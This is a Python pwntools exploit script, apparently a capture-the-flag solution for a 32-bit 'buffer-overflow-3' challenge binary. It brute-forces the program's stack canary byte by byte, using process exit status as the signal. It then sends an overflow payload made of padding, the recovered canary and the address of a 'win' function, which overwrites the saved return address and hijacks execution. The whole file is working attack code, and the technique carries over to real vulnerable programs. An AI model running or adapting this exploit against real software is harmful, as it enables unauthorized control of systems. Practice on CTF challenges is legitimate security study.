#! /usr/bin/env python
import sys
#
from pwn import context, p32, u32, log, process, args
from pwn import ELF
context.clear(arch='i386', os='linux', endian='little', word_size=32)


class ExploitInfo:
    name    = '/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f/vuln'
    elf     = ELF(name)
    #
    CANARY_SIZE       = 4
    offset_canary     = 0x30 - 0x10
    offset_canary_eip = 0x10 + 4


def bruteforce_canary():
    padding = 'A' * ExploitInfo.offset_canary
    leak_canary = ''

    for x in xrange(ExploitInfo.CANARY_SIZE):
        count = ExploitInfo.offset_canary + x + 1
        log.info("count         : %d", count)
        canary_byte = 0
        while canary_byte < 0x100:
            p = process(ExploitInfo.name)

            p.clean()
            p.sendline(str(count))

            payload = padding
            payload += leak_canary + chr(canary_byte)

            # log.info("len(payload)  : %d", len(payload))
            log.info("payload       : %r", payload)

            p.clean()
            p.send(payload)

            p.wait_for_close()
            if p.poll() == 0:
                leak_canary += chr(canary_byte)
                log.info("current canary: 0x%x", u32(leak_canary.ljust(ExploitInfo.CANARY_SIZE, '\x00')))
                break
            p.close()
            canary_byte += 1

    return leak_canary


def main():
    leak_canary = p32(0x2c567834)
    if args.RESTART:
        leak_canary = bruteforce_canary()

    # Now exploit it!
    log.success("Const canary: 0x%x", u32(leak_canary))

    p = process(ExploitInfo.name)

    payload = 'A' * ExploitInfo.offset_canary
    payload += leak_canary
    payload += 'A' * (ExploitInfo.offset_canary_eip - 4)
    payload += p32(ExploitInfo.elf.symbols['win'])

    log.info("payload       : %r", payload)

    count = len(payload)

    p.clean()
    p.sendline(str(count))
    p.send(payload)
    print(p.recv(4096))


if __name__ == "__main__":
    main()
